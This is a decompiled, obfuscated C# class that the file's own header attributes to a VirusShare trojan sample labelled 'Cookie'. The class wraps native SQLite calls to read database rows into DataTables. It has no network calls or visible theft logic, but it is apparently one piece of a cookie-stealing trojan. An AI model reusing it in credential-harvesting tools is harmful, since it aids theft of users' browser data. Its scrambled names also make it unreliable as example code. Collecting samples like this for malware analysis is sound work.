// Decompiled with JetBrains decompiler
// Type: .
// Assembly: x1x1x1x1x1x1x1x1x, Version=2.1.1.2, Culture=neutral, PublicKeyToken=null
// MVID: 41668E8C-580E-4768-8756-53F1BC9ECCC7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan-Dropper.MSIL.Cookie.e-e73a14fc8e256d29203c913eab14be6d27a7cfbe002ae112a4b3e56f2707759e.exe

using \u0001;
using System;
using System.Data;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0006
{
  internal sealed class \u0001
  {
    private IntPtr \u0001;

    [DllImport("kernel32", EntryPoint = "HeapAlloc")]
    private static extern IntPtr \u0003([In] IntPtr obj0, [In] uint obj1, [In] uint obj2);

    [DllImport("kernel32", EntryPoint = "GetProcessHeap")]
    private static extern IntPtr \u0003();

    [DllImport("kernel32", EntryPoint = "lstrlen")]
    private static extern int \u0003([In] IntPtr obj0);

    [DllImport("sqlite3", EntryPoint = "sqlite3_open")]
    private static extern int \u0003([In] IntPtr obj0, [In] ref IntPtr obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_prepare_v2")]
    private static extern int \u0003(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In] int obj2,
      [In] ref IntPtr obj3,
      [In] ref IntPtr obj4);

    [DllImport("sqlite3", EntryPoint = "sqlite3_step")]
    private static extern int \u0004([In] IntPtr obj0);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_count")]
    private static extern int \u0005([In] IntPtr obj0);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_name")]
    private static extern IntPtr \u0003([In] IntPtr obj0, [In] int obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_type")]
    private static extern int \u0003([In] IntPtr obj0, [In] int obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_int")]
    private static extern int \u0004([In] IntPtr obj0, [In] int obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_double")]
    private static extern double \u0003([In] IntPtr obj0, [In] int obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_text")]
    private static extern IntPtr \u0004([In] IntPtr obj0, [In] int obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_blob")]
    private static extern IntPtr \u0005([In] IntPtr obj0, [In] int obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_finalize")]
    private static extern int \u0006([In] IntPtr obj0);

    public \u0001() => this.\u0001 = IntPtr.Zero;

    public \u0001([In] string obj0) => this.\u0003(obj0);

    public void \u0003([In] string obj0)
    {
      if (\u0006.\u0001.\u0003(this.\u0003(obj0), ref this.\u0001) != 0)
      {
        this.\u0001 = IntPtr.Zero;
        throw new Exception(\u0002\u0005.\u001C\u0003(\u0004.\u0003(29450), obj0, \u0004.\u0003(2022)));
      }
    }

    public DataTable \u0003([In] string obj0)
    {
      IntPtr num1;
      IntPtr num2;
      \u0006.\u0001.\u0003(this.\u0001, this.\u0003(obj0), this.\u0007(this.\u0003(obj0)), ref num1, ref num2);
      DataTable dataTable = new DataTable();
      int num3 = this.\u0003(num1, ref dataTable);
      while (num3 == 100)
        num3 = this.\u0004(num1, ref dataTable);
      \u0006.\u0001.\u0006(num1);
      return dataTable;
    }

    private int \u0003([In] IntPtr obj0, [In] ref DataTable obj1)
    {
      obj1 = new DataTable(\u0004.\u0003(29491));
      if (\u0006.\u0001.\u0004(obj0) == 100)
      {
        int num1 = \u0006.\u0001.\u0005(obj0);
        \u0004.\u0003(1908);
        object[] objArray = new object[checked (num1 - 1 + 1)];
        int num2 = checked (num1 - 1);
        int index = 0;
        while (index <= num2)
        {
          string str = this.\u0003(\u0006.\u0001.\u0003(obj0, index));
          switch (\u0006.\u0001.\u0003(obj0, index))
          {
            case 1:
              DataColumn dataColumn1 = \u0084\u0004.\u007E\u0086\u0008((object) \u0084\u0003.\u007E\u008C\u0008((object) obj1), str, \u007F\u0002.\u001C\u0004(\u0004.\u0003(29508)));
              objArray[index] = (object) \u0006.\u0001.\u0004(obj0, index);
              break;
            case 2:
              DataColumn dataColumn2 = \u0084\u0004.\u007E\u0086\u0008((object) \u0084\u0003.\u007E\u008C\u0008((object) obj1), str, \u007F\u0002.\u001C\u0004(\u0004.\u0003(29525)));
              objArray[index] = (object) \u0006.\u0001.\u0003(obj0, index);
              break;
            case 3:
              DataColumn dataColumn3 = \u0084\u0004.\u007E\u0086\u0008((object) \u0084\u0003.\u007E\u008C\u0008((object) obj1), str, \u007F\u0002.\u001C\u0004(\u0004.\u0003(29546)));
              objArray[index] = (object) this.\u0003(\u0006.\u0001.\u0004(obj0, index));
              break;
            case 4:
              DataColumn dataColumn4 = \u0084\u0004.\u007E\u0086\u0008((object) \u0084\u0003.\u007E\u008C\u0008((object) obj1), str, \u007F\u0002.\u001C\u0004(\u0004.\u0003(29546)));
              objArray[index] = (object) this.\u0003(\u0006.\u0001.\u0005(obj0, index));
              break;
            default:
              DataColumn dataColumn5 = \u0084\u0004.\u007E\u0086\u0008((object) \u0084\u0003.\u007E\u008C\u0008((object) obj1), str, \u007F\u0002.\u001C\u0004(\u0004.\u0003(29546)));
              objArray[index] = (object) \u0004.\u0003(1908);
              break;
          }
          checked { ++index; }
        }
        DataRow dataRow = \u0004\u0003.\u007E\u0088\u0008((object) \u0012\u0002.\u007E\u008D\u0008((object) obj1), objArray);
      }
      return \u0006.\u0001.\u0004(obj0);
    }

    private int \u0004([In] IntPtr obj0, [In] ref DataTable obj1)
    {
      int num1 = \u0006.\u0001.\u0005(obj0);
      object[] objArray = new object[checked (num1 - 1 + 1)];
      int num2 = checked (num1 - 1);
      int index = 0;
      while (index <= num2)
      {
        switch (\u0006.\u0001.\u0003(obj0, index))
        {
          case 1:
            objArray[index] = (object) \u0006.\u0001.\u0004(obj0, index);
            break;
          case 2:
            objArray[index] = (object) \u0006.\u0001.\u0003(obj0, index);
            break;
          case 3:
            objArray[index] = (object) this.\u0003(\u0006.\u0001.\u0004(obj0, index));
            break;
          case 4:
            objArray[index] = (object) this.\u0003(\u0006.\u0001.\u0005(obj0, index));
            break;
          default:
            objArray[index] = (object) \u0004.\u0003(1908);
            break;
        }
        checked { ++index; }
      }
      DataRow dataRow = \u0004\u0003.\u007E\u0088\u0008((object) \u0012\u0002.\u007E\u008D\u0008((object) obj1), objArray);
      return \u0006.\u0001.\u0004(obj0);
    }

    private IntPtr \u0003([In] string obj0)
    {
      switch (obj0)
      {
        case null:
          return IntPtr.Zero;
        default:
          Encoding encoding = \u0082\u0004.\u0011\u0005();
          byte[] numArray = \u0089\u0004.\u007E\u0008\u0005((object) encoding, obj0);
          uint num1 = checked ((uint) (numArray.Length + 1));
          IntPtr num2 = \u0006.\u0001.\u0003(\u0006.\u0001.\u0003(), 0U, num1);
          \u009A\u0004.\u001C\u0005(numArray, 0, num2, numArray.Length);
          \u0012\u0005.\u001E\u0005(num2, numArray.Length, (byte) 0);
          return num2;
      }
    }

    private string \u0003([In] IntPtr obj0)
    {
      if (\u0012\u0004.\u0012\u0004(obj0, IntPtr.Zero))
        return (string) null;
      Encoding encoding = \u0082\u0004.\u0011\u0005();
      int num = this.\u0007(obj0);
      byte[] numArray = new byte[checked (num - 1 + 1)];
      \u0088\u0003.\u001D\u0005(obj0, numArray, 0, num);
      return \u008F\u0002.\u007E\u0010\u0005((object) encoding, numArray, 0, num);
    }

    private int \u0007([In] IntPtr obj0) => \u0012\u0004.\u0012\u0004(obj0, IntPtr.Zero) ? 0 : \u0006.\u0001.\u0003(obj0);
  }
}
